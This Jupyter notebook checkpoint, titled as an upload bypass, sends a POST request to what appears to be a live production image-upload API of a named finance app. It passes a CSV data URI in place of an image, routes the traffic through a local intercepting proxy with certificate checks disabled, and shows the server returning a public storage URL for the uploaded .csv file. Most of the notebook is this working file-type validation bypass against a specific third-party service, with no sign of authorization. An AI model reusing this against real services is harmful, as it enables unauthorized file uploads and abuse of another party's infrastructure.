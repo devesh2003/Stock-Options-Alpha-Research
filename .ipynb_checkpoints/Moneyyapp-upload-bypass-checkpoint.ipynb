{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "f19ea4da",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71167106",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "1e6d820f",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"https://api-engage.moneyyapp.in/v1/imageupload/upload\"\n",
    "headers = {\n",
    "    \"User-Agent\":\"Google\",\n",
    "    \"Content-Type\":\"application/json\"\n",
    "}\n",
    "\n",
    "data = {\n",
    "    \"image\":\"data:text/csv;base64,Qm\"\n",
    "}\n",
    "\n",
    "proxies = {\n",
    "    \"https\":\"127.0.0.1:8080\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f9b870da",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\users\\deves\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\urllib3\\connectionpool.py:1050: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  InsecureRequestWarning,\n"
     ]
    }
   ],
   "source": [
    "r = requests.post(url,headers=headers,json=data,verify=False,proxies=proxies)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "38e255c5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'https://myy1.sgp1.digitaloceanspaces.com/banner1656668855865.csv'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9278630c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
